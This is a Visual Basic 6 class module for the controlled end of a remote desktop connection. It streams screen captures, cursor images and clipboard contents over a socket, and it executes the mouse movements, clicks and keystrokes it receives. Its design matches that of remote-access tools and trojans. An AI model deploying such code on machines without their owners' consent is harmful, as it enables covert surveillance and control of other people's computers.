VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "ClsDesktop"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit
Private Declare Function SetCursorPos Lib "user32" (ByVal x As Long, ByVal y As Long) As Long
Private Declare Sub mouse_event Lib "user32" (ByVal dwFlags As Long, ByVal dx As Long, ByVal dy As Long, ByVal cButtons As Long, ByVal dwExtraInfo As Long)
Private Declare Function GetCursor Lib "user32" () As Long
Private Declare Sub keybd_event Lib "user32.dll" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As Long)
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
Private Declare Function SetClipboardViewer Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function IsClipboardFormatAvailable Lib "user32" (ByVal wFormat As Long) As Long
Private Declare Function GetCursorInfo Lib "user32.dll" (ByRef pci As PCURSORINFO) As Long
Private Declare Function GetIconInfo Lib "user32.dll" (ByVal hIcon As Long, ByRef piconinfo As ICONINFO) As Long
Private Declare Function GetDIBits Lib "gdi32.dll" (ByVal aHDC As Long, ByVal hBitmap As Long, ByVal nStartScan As Long, ByVal nNumScans As Long, ByRef lpBits As Any, ByRef lpBI As BITMAPINFO, ByVal wUsage As Long) As Long
Private Declare Function DeleteObject Lib "gdi32.dll" (ByVal hObject As Long) As Long
Private Declare Function RtlGetCompressionWorkSpaceSize Lib "NTDLL" (ByVal flags As Integer, WorkSpaceSize As Long, UNKNOWN_PARAMETER As Long) As Long
Private Declare Function NtAllocateVirtualMemory Lib "ntdll.dll" (ByVal ProcHandle As Long, BaseAddress As Long, ByVal NumBits As Long, regionsize As Long, ByVal flags As Long, ByVal ProtectMode As Long) As Long
Private Declare Function RtlCompressBuffer Lib "NTDLL" (ByVal flags As Integer, ByVal BuffUnCompressed As Long, ByVal UnCompSize As Long, ByVal BuffCompressed As Long, ByVal CompBuffSize As Long, ByVal UNKNOWN_PARAMETER As Long, OutputSize As Long, ByVal WorkSpace As Long) As Long
Private Declare Function RtlDecompressBuffer Lib "NTDLL" (ByVal flags As Integer, ByVal BuffUnCompressed As Long, ByVal UnCompSize As Long, ByVal BuffCompressed As Long, ByVal CompBuffSize As Long, OutputSize As Long) As Long
Private Declare Function NtFreeVirtualMemory Lib "ntdll.dll" (ByVal ProcHandle As Long, BaseAddress As Long, regionsize As Long, ByVal flags As Long) As Long
Private Declare Function PostMessage Lib "user32.dll" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByRef lParam As Long) As Long
Private Declare Function GetGUIThreadInfo Lib "user32.dll" (ByVal idThread As Long, ByRef pgui As GUITHREADINFO) As Long
Private Declare Function GetForegroundWindow Lib "user32.dll" () As Long
Private Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As Long, ByRef lpdwProcessId As Long) As Long
Private Declare Function GetDC Lib "user32.dll" (ByVal hwnd As Long) As Long
Private Declare Function ReleaseDC Lib "user32.dll" (ByVal hwnd As Long, ByVal hdc As Long) As Long
Private Declare Function SendInput Lib "user32.dll" (ByVal nInputs As Long, pInputs As GENERALINPUT, ByVal cbSize As Long) As Long


Private Type RECT
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type

' Utilizado para obtener el foco de la ventana hija (parecido GetFocus pero en una aplicacion externa)
Private Type GUITHREADINFO
    cbSize As Long
    flags As Long
    hwndActive As Long
    hwndFocus As Long
    hwndCapture As Long
    hwndMenuOwner As Long
    hwndMoveSize As Long
    hwndCaret As Long
    rcCaret As RECT
End Type
Private Type POINTAPI
    x               As Long
    y               As Long
End Type

' Recupera información del cursor.
Private Type PCURSORINFO
    cbSize          As Long
    flags           As Long
    hCursor         As Long
    ptScreenPos     As POINTAPI
End Type

Private Type ICONINFO
    fIcon           As Long
    xHotspot        As Long
    yHotspot        As Long
    hbmMask         As Long
    hbmColor        As Long
End Type

' Utilizado para obtener la imágen en bits del cursor.
Private Type BITMAPINFOHEADER
    biSize          As Long
    biWidth         As Long
    biHeight        As Long
    biPlanes        As Integer
    biBitCount      As Integer
    biCompression   As Long
    biSizeImage     As Long
    biXPelsPerMeter As Long
    biYPelsPerMeter As Long
    biClrUsed       As Long
    biClrImportant  As Long
End Type

Private Type BITMAPINFO
    bmiHeader       As BITMAPINFOHEADER
    bmiColors(1 To 256) As Long
End Type

Private Const KEYEVENTF_EXTENDEDKEY     As Long = &H1
Private Const KEYEVENTF_KEYUP           As Long = &H2

'// Mouse Envent Constates
Private Const MOUSEEVENTF_ABSOLUTE      As Long = &H8000
Private Const MOUSEEVENTF_LEFTDOWN      As Long = &H2
Private Const MOUSEEVENTF_LEFTUP        As Long = &H4
Private Const MOUSEEVENTF_MIDDLEDOWN    As Long = &H20
Private Const MOUSEEVENTF_MIDDLEUP      As Long = &H40
Private Const MOUSEEVENTF_MOVE          As Long = &H1
Private Const MOUSEEVENTF_RIGHTDOWN     As Long = &H8
Private Const MOUSEEVENTF_RIGHTUP       As Long = &H10
Private Const MOUSEEVENTF_VIRTUALDESK   As Long = &H4000
Private Const MOUSEEVENTF_WHEEL         As Long = &H800
Private Const MOUSEEVENTF_XDOWN         As Long = &H80
Private Const MOUSEEVENTF_XUP           As Long = &H100

'// Windows Envent Mesage
Private Const WM_MOUSEMOVE              As Long = &H200
Private Const WM_LBUTTONDBLCLK          As Long = &H203
Private Const WM_LBUTTONDOWN            As Long = &H201
Private Const WM_LBUTTONUP              As Long = &H202
Private Const WM_RBUTTONDBLCLK          As Long = &H206
Private Const WM_RBUTTONDOWN            As Long = &H204
Private Const WM_RBUTTONUP              As Long = &H205
Private Const WM_KEYDOWN                As Long = &H100
Private Const WM_KEYUP                  As Long = &H101
Private Const WM_SYSKEYUP               As Long = &H105
Private Const WM_SYSKEYDOWN             As Long = &H104
Private Const WM_CHAR                   As Long = &H102
Private Const WM_CONTEXTMENU            As Long = &H7B
Private Const WM_DRAWCLIPBOARD          As Long = &H308
Private Const WM_MOUSEWHEEL             As Long = &H20A

Private Type KEYBDINPUT
  wVk As Integer
  wScan As Integer
  dwFlags As Long
  time As Long
  dwExtraInfo As Long
  dwExtraInfo2 As Long
  dwExtraInfo3 As Long
End Type

Private Type GENERALINPUT
  dwType As Long
  ki As KEYBDINPUT
End Type

'Const KEYEVENTF_KEYUP = &H2
Const INPUT_KEYBOARD = 1


Private Const Delim3 As String = "@&|?"

Public ID_Connection            As Long
Private m_Data                  As String
Private WithEvents Timer1       As cTimer
Attribute Timer1.VB_VarHelpID = -1
Private WithEvents cScreen      As ClsScreen
Attribute cScreen.VB_VarHelpID = -1
Private LasthCursor                 As Long


Public Sub Socket_DataArrival(ID As Long, IP As String, Puerto As String, Data As String)
    On Error GoTo ErrHaddle
    
    Dim lRet1       As Long
    Dim lRet2       As Long
    Dim sCommand    As String
    Dim sBuf        As String
    Dim vParam()    As String
    
    m_Data = m_Data & Data

    lRet1 = InStr(m_Data, END_DATA)
    
    If lRet1 Then
   
        sBuf = Left$(m_Data, lRet1 - 1)
        m_Data = Mid$(m_Data, lRet1 + Len(END_DATA))

        lRet2 = InStr(sBuf, Delimiter)
        sCommand = Left(sBuf, lRet2 - 1)
        sBuf = Mid(sBuf, lRet2 + 1)

        Select Case sCommand
        
            Case 0 'Infor de la pantalla
                WinSock32.SendData ID_Connection, "2" & Delimiter & Screen.Width / Screen.TwipsPerPixelX & Delimiter & Screen.Height / Screen.TwipsPerPixelY & END_DATA
                Timer1.CreateTimer 100
                'HookClipboard FrmCliente.hwnd, ID_Connection
                
            Case 1 'Actualizar
                Timer1.CreateTimer 100
                
            Case 2 'Calidad de la captura
                SetPixelFormat sBuf
                
            Case 3 'Ajustar a la pantalla
                vParam = Split(sBuf, Delimiter)
                cScreen.ScreenWidth = vParam(0)
                cScreen.ScreenHeight = vParam(1)
                cScreen.AdjustedCapture = vParam(2)
            Case 4 'Enviar Cursor
                SendDataCursor sBuf
                
            Case 5 'Remote Clipboard
                RemoteClipboardChange = True
                Clipboard.Clear
                Clipboard.SetText sBuf
                DoEvents
                RemoteClipboardChange = False
                
            Case 6 'Local Clipboard
                If CBool(sBuf) Then
                    HookClipboard FrmCliente.hwnd, ID_Connection
                Else
                    UnHookClipboard FrmCliente.hwnd
                End If
                
            Case 7 'Paint local cursor in capture
                cScreen.PaintCursor = Not CBool(sBuf)
                
            Case WM_MOUSEMOVE
                vParam = Split(sBuf, Delimiter)
                SetCursorPos vParam(1), vParam(2)
                CaptureCursor
                
            Case WM_LBUTTONDOWN
                mouse_event MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0
                
            Case WM_LBUTTONUP
                mouse_event MOUSEEVENTF_LEFTUP, 0, 0, 0, 0
                
            Case WM_LBUTTONDBLCLK
                mouse_event MOUSEEVENTF_LEFTDOWN Or MOUSEEVENTF_LEFTUP, 0, 0, 0, 0
                mouse_event MOUSEEVENTF_LEFTDOWN Or MOUSEEVENTF_LEFTUP, 0, 0, 0, 0
                
            Case WM_RBUTTONDOWN
                mouse_event MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0
                
            Case WM_RBUTTONUP
               mouse_event MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0
               
            Case WM_RBUTTONDBLCLK
                mouse_event MOUSEEVENTF_RIGHTDOWN Or MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0
                mouse_event MOUSEEVENTF_RIGHTDOWN Or MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0
                
            Case WM_CONTEXTMENU, WM_MOUSEWHEEL ', WM_CHAR
                Dim Handle As Long
                Handle = GetFocusHandle
                vParam = Split(sBuf, Delimiter)
                If Handle <> 0 And vParam(1) <> vbKeyTab Then
                    PostMessage Handle, sCommand, vParam(0), vParam(1)
                End If
            Case WM_KEYDOWN ', WM_KEYUP
                vParam = Split(sBuf, Delimiter)
                
                SendKeyEx vParam(0), vParam(1)

        End Select
                
        If Len(m_Data) Then
            If InStr(m_Data, END_DATA) Then Call Me.Socket_DataArrival(ID, IP, Puerto, vbNullString)
        End If
        
    End If
    
ErrHaddle:
End Sub

Private Function SendKeyEx(ByVal bKey As Byte, ByVal Shift As Integer) As Boolean
    Dim GInput()  As GENERALINPUT
    Dim lCount As Long
    Dim i As Long
    
    If Shift > 0 Then
        If (Shift And vbCtrlMask) = vbCtrlMask Then
            lCount = lCount + 1
            ReDim Preserve GInput(lCount)
             With GInput(lCount)
                .ki.wVk = vbKeyControl
                .ki.dwFlags = 0
                .dwType = INPUT_KEYBOARD
            End With
        End If
        
        If (Shift And vbShiftMask) = vbShiftMask Then
            lCount = lCount + 1
            ReDim Preserve GInput(lCount)
             With GInput(lCount)
                .ki.wVk = vbKeyShift
                .ki.dwFlags = 0
                .dwType = INPUT_KEYBOARD
            End With
        End If
        
        If (Shift And vbAltMask) = vbAltMask Then
            lCount = lCount + 1
            ReDim Preserve GInput(lCount)
             With GInput(lCount)
                .ki.wVk = vbKeyMenu
                .ki.dwFlags = 0
                .dwType = INPUT_KEYBOARD
            End With
        End If
        
        SendKeyEx = (SendInput(lCount, GInput(1), Len(GInput(1))) <> 0)
        
        keybd_event bKey, 0, KEYEVENTF_EXTENDEDKEY, 0
        DoEvents
        keybd_event bKey, 0, KEYEVENTF_EXTENDEDKEY Or KEYEVENTF_KEYUP, 0
    
        For i = 1 To lCount
            GInput(i).ki.dwFlags = KEYEVENTF_KEYUP
        Next
        
        
        SendKeyEx = (SendInput(lCount, GInput(1), Len(GInput(1))) <> 0)
    Else
        keybd_event bKey, 0, KEYEVENTF_EXTENDEDKEY, 0
        DoEvents
        keybd_event bKey, 0, KEYEVENTF_EXTENDEDKEY Or KEYEVENTF_KEYUP, 0
    End If
End Function


Private Function SendKey(ByVal bKey As Byte) As Boolean
    Dim GInput(1)  As GENERALINPUT
    
    With GInput(0)
        .ki.wVk = bKey
        .ki.dwFlags = 0
        .dwType = INPUT_KEYBOARD
    End With
    
    With GInput(1)
        .ki.wVk = bKey
        .ki.dwFlags = KEYEVENTF_KEYUP
        .dwType = INPUT_KEYBOARD
    End With

    SendKey = (SendInput(2, GInput(0), Len(GInput(0))) <> 0)
End Function

Private Function SetKeyState(ByVal bKey As Byte, ByVal Press As Boolean) As Boolean
    Dim GInput  As GENERALINPUT
    With GInput
        .ki.wVk = bKey
        .ki.dwFlags = IIf(Press, 0, KEYEVENTF_KEYUP)
        .dwType = INPUT_KEYBOARD
    End With
    SetKeyState = (SendInput(1, GInput, Len(GInput)) <> 0)
End Function



Private Function GetFocusHandle() As Long
    Dim GTI As GUITHREADINFO
    GTI.cbSize = Len(GTI)
    GetGUIThreadInfo GetWindowThreadProcessId(GetForegroundWindow, 0), GTI
    GetFocusHandle = GTI.hwndFocus
End Function

' Calidad de los fragmentos.
Private Sub SetPixelFormat(ByVal Value As Long)
    With cScreen
        Select Case Value
            Case 0: .PixelFormatCompress = enuPixelFormat1bppIndexed
            Case 1: .PixelFormatCompress = enuPixelFormat4bppIndexed
            Case 2: .PixelFormatCompress = enuPixelFormat8bppIndexed
            Case 3: .PixelFormatCompress = enuPixelFormat16bppRGB
            Case 4: .PixelFormatCompress = enuPixelFormat24bppRGB
            Case 5: .PixelFormatCompress = enuPixelFormat32bppRGB
        End Select
        .ResetFrames
    End With
End Sub


Public Sub Socket_Close(ID As Long, IP As String, Puerto As String)
    ID_Connection = 0
End Sub

Public Sub Socket_Conect(ID As Long, IP As String, Puerto As String)
    
End Sub

Private Sub Class_Initialize()
    Set Timer1 = New cTimer
    Set cScreen = New ClsScreen
End Sub

Private Sub Class_Terminate()
    If ID_Connection Then
        WinSock32.WsClose ID_Connection
    End If
    Set Timer1 = Nothing
    Set cScreen = Nothing
    UnHookClipboard FrmCliente.hwnd
End Sub

Private Sub cScreen_FrameChanged(ByVal Change As Boolean, FramesCount As Long, bCoordData() As Byte, bImageData() As Byte)
    If Change Then
        WinSock32.SendData ID_Connection, "0" & Delimiter
        WinSock32.SendData ID_Connection, bCoordData
        WinSock32.SendData ID_Connection, END_DATA
        
        WinSock32.SendData ID_Connection, "1" & Delimiter
        WinSock32.SendData ID_Connection, bImageData
        WinSock32.SendData ID_Connection, END_DATA
    Else
        Timer1.CreateTimer 100
    End If
End Sub

Private Sub Timer1_Timer(ByVal ThisTime As Long)
    Timer1.DestroyTimer
    If ID_Connection = 0 Then Exit Sub
    cScreen.UpdateViewport
End Sub


' Verifica si el puntero del cursor cambió su icono,
' si es así envia el handle de éste al receptor el cual verificará si ya lo posee en su caché
' de no ser así, el receptor enviará un mensaje pidiendo el array de bits sobre dicho cursor.
Private Sub CaptureCursor()
    Dim CI As PCURSORINFO
    CI.cbSize = Len(CI)
    GetCursorInfo CI
    If CI.hCursor <> LasthCursor Then
        LasthCursor = CI.hCursor
        WinSock32.SendData ID_Connection, "3" & Delimiter & LasthCursor & END_DATA
    End If
End Sub

' Envia el array de bits del cursor actual.
Private Sub SendDataCursor(ByVal hCursor As Long)
On Error GoTo CursorErr

    Dim Data()          As Byte
    Dim CursorData()    As Byte
    Dim CompressData()  As Byte

    If SaveCursorToStream(hCursor, CursorData) Then
        WinSock32.SendData ID_Connection, "4" & Delimiter & hCursor & Delim3
        WinSock32.SendData ID_Connection, CursorData
        WinSock32.SendData ID_Connection, END_DATA
    End If
    
    
CursorErr:
    Debug.Print err.Description
End Sub


' Función para obtener el icono del cursor en un array de bits.
' By LaVolpe
Private Function SaveCursorToStream(ByVal hIcon As Long, bData() As Byte) As Boolean

    If hIcon = 0 Then Exit Function

    Dim bits() As Long, pow2(0 To 8) As Long
    Dim scanWidth As Long, maskScan As Long, clrScan As Long
    Dim bNewColor As Boolean
    Dim x As Long, y As Long, palIndex As Long, palShift As Long, palPtr As Long
    Dim ICI As ICONINFO, BHI As BITMAPINFO
    Dim TempDC As Long
      
    If GetIconInfo(hIcon, ICI) = 0& Then Exit Function

    If ICI.hbmColor = 0& Then
        ' black and white image, already in needed format
        TempDC = GetDC(0)
        BHI.bmiHeader.biSize = 40
        If GetDIBits(TempDC, ICI.hbmMask, 0&, 0&, ByVal 0&, BHI, 0&) Then
            BHI.bmiColors(2) = vbWhite
            With BHI.bmiHeader
                maskScan = ByteAlignOnWord(1, .biWidth)
                .biBitCount = 1
                .biClrImportant = 2
                .biClrUsed = 2
                .biCompression = 0&
                .biSizeImage = maskScan * .biHeight
                ReDim bData(0 To .biSizeImage + 69&)
                
                ReDim b(0 To .biSizeImage)
                If GetDIBits(TempDC, ICI.hbmMask, 0&, .biHeight, bData(70), BHI, 0&) Then
                    DeleteObject ICI.hbmMask: ICI.hbmMask = 0&
                    .biClrImportant = 2&
                    .biClrUsed = 2&
                    bData(8) = .biClrUsed
                    bData(2) = 2  ' type: cursor' icon = 1
                    bData(4) = 1  ' count
                    If .biWidth < 256 Then bData(6) = .biWidth
                    If .biHeight < 512 Then bData(7) = .biHeight \ 2
                    bData(10) = ICI.xHotspot '   1 ' planes
                    bData(12) = ICI.yHotspot '.biBitCount
                    CopyMemory bData(14), CLng(UBound(bData) - 21&), 4& ' bytes in resource
                    bData(18) = 22 ' offset into directory where BHI starts
                    CopyMemory bData(bData(18)), BHI, 48&
                    SaveCursorToStream = True
                End If
            End With
        End If
        ReleaseDC 0&, TempDC
    Else
        BHI.bmiHeader.biSize = 40
        TempDC = GetDC(0)
        If GetDIBits(TempDC, ICI.hbmColor, 0&, 0&, ByVal 0&, BHI, 0&) Then
            With BHI.bmiHeader
                scanWidth = .biWidth * 4&
                maskScan = ByteAlignOnWord(1, .biWidth)
                .biBitCount = 32&
                .biSize = 40
                .biCompression = 0&
                .biSizeImage = scanWidth * .biHeight
                ReDim bits(0 To .biWidth * .biHeight - 1&)
            End With
            If GetDIBits(TempDC, ICI.hbmColor, 0&, BHI.bmiHeader.biHeight, bits(0), BHI, 0&) Then
                DeleteObject ICI.hbmColor: ICI.hbmColor = 0&
                With BHI.bmiHeader
                    For x = 0& To .biWidth * .biHeight - 1&
                        If bits(x) <> (bits(x) And &HFFFFFF) Then
                            .biClrImportant = 0&
                            Exit For
                        End If
                        If .biBitCount = 32 Then
                            palIndex = FindColor(BHI.bmiColors(), bits(x), .biClrImportant, bNewColor)
                            If bNewColor Then
                                If .biClrImportant = 256& Then ' either 24 bit or 32 bit icon
                                    .biBitCount = 24
                                    .biClrImportant = 0&
                                ElseIf bNewColor Then
                                    .biClrImportant = .biClrImportant + 1
                                    If palIndex < .biClrImportant Then
                                        CopyMemory BHI.bmiColors(palIndex + 1&), BHI.bmiColors(palIndex), (.biClrImportant - palIndex) * 4&
                                    End If
                                    BHI.bmiColors(palIndex) = bits(x)
                                End If
                            End If
                        End If
                    Next
                End With
                If BHI.bmiHeader.biClrImportant Then
                    With BHI.bmiHeader
                        Select Case .biClrImportant
                            Case Is < 3: .biBitCount = 1
                            Case Is < 17: .biBitCount = 4
                            Case Else: .biBitCount = 8
                        End Select
                        pow2(0) = 1&
                        For x = 1& To .biBitCount
                            pow2(x) = pow2(x - 1&) * 2&
                        Next
                        clrScan = ByteAlignOnWord(.biBitCount, .biWidth)
                        .biClrUsed = pow2(.biBitCount)
                        .biSizeImage = clrScan * .biHeight
                        ReDim bData(0 To .biSizeImage + maskScan * .biHeight + .biClrUsed * 4& + 61&)
                        x = 0&
                        For y = x To .biHeight - 1&
                            palShift = 8& - .biBitCount
                            palPtr = 62& + .biClrUsed * 4& + y * clrScan
                            For x = x To x + .biWidth - 1&
                                palIndex = FindColor(BHI.bmiColors(), bits(x), .biClrImportant, bNewColor) - 1&
                                bData(palPtr) = bData(palPtr) Or (palIndex * pow2(palShift))
                                If palShift = 0& Then
                                    palPtr = palPtr + 1&
                                    palShift = 8& - .biBitCount
                                Else
                                    palShift = palShift - .biBitCount
                                End If
                            Next
                        Next
                        If .biClrUsed < 256 Then bData(8) = .biClrUsed
                    End With
                Else ' can be 24 or 32 bit color
                    With BHI.bmiHeader
                        clrScan = ByteAlignOnWord(.biBitCount, .biWidth)
                        .biSizeImage = clrScan * .biHeight
                        ReDim bData(0 To .biSizeImage + maskScan * .biHeight + 61&)
                        If .biBitCount = 32 Then
                            CopyMemory bData(62), bits(0), .biSizeImage
                        Else
                            x = 0&
                            For y = x To .biHeight - 1&
                                palPtr = y * clrScan + 62&
                                For x = x To .biWidth - 1&
                                    CopyMemory bData(palPtr), bits(x), 3&
                                    palPtr = palPtr + 3&
                                Next
                            Next
                        End If
                    End With
                End If
                Erase bits()
                
                bData(2) = 2  ' type: icon
                bData(4) = 1  ' count
                If BHI.bmiHeader.biWidth < 256 Then bData(6) = BHI.bmiHeader.biWidth
                If BHI.bmiHeader.biHeight < 256 Then bData(7) = BHI.bmiHeader.biHeight
                BHI.bmiHeader.biHeight = BHI.bmiHeader.biHeight + BHI.bmiHeader.biHeight
                'bData(10) = 1 ' planes
                'bData(12) = BHI.bmiHeader.biBitCount
                
                bData(10) = ICI.xHotspot '   1 ' planes
                bData(12) = ICI.yHotspot '.biBitCount
                
                CopyMemory bData(14), CLng(UBound(bData) - 21&), 4& ' bytes in resource
                bData(18) = 22 ' offset into directory where BHI starts
                CopyMemory bData(bData(18)), BHI, BHI.bmiHeader.biClrUsed * 4& + 40&
                If ICI.hbmMask Then
                    BHI.bmiColors(2) = vbWhite
                    With BHI.bmiHeader
                        .biBitCount = 1
                        .biClrImportant = 2
                        .biClrUsed = 2
                        .biHeight = .biHeight \ 2
                        .biSizeImage = 0&
                        palPtr = UBound(bData) - maskScan * .biHeight + 1&
                    End With
                    GetDIBits TempDC, ICI.hbmMask, 0&, BHI.bmiHeader.biHeight, bData(palPtr), BHI, 0&
                    DeleteObject ICI.hbmMask: ICI.hbmMask = 0&
                End If
                SaveCursorToStream = True
            End If
        End If
        ReleaseDC 0&, TempDC
    End If
        
    If ICI.hbmColor Then DeleteObject ICI.hbmColor
    If ICI.hbmMask Then DeleteObject ICI.hbmMask

End Function

Private Function FindColor(ByRef PaletteItems() As Long, ByVal Color As Long, ByVal Count As Long, ByRef isNew As Boolean) As Long

    ' MODIFIED BINARY SEARCH ALGORITHM -- Divide and conquer.
    ' Binary search algorithms are about the fastest on the planet, but
    ' its biggest disadvantage is that the array must already be sorted.
    ' Ex: binary search can find a value among 1 million values between 1 and 20 iterations
    
    ' [in] PaletteItems(). Long Array to search within. Array must be 1-bound
    ' [in] Color. A value to search for. Order is always ascending
    ' [in] Count. Number of items in PaletteItems() to compare against
    ' [out] isNew. If Color not found, isNew is True else False
    ' [out] Return value: The Index where Color was found or where the new Color should be inserted

    Dim UB As Long, LB As Long
    Dim newIndex As Long
    
    If Count = 0& Then
        FindColor = 1&
        isNew = True
        Exit Function
    End If
    
    UB = Count
    LB = 1&
    
    Do Until LB > UB
        newIndex = LB + ((UB - LB) \ 2&)
        If PaletteItems(newIndex) = Color Then
            Exit Do
        ElseIf PaletteItems(newIndex) > Color Then ' new color is lower in sort order
            UB = newIndex - 1&
        Else ' new color is higher in sort order
            LB = newIndex + 1&
        End If
    Loop

    If LB > UB Then  ' color was not found
            
        If Color > PaletteItems(newIndex) Then newIndex = newIndex + 1&
        isNew = True
        
    Else
        isNew = False
    End If
    
    FindColor = newIndex

End Function

Private Function ByteAlignOnWord(ByVal bitDepth As Byte, ByVal Width As Long) As Long
    ' function to align any bit depth on dWord boundaries
    ByteAlignOnWord = (((Width * bitDepth) + &H1F&) And Not &H1F&) \ &H8&
End Function



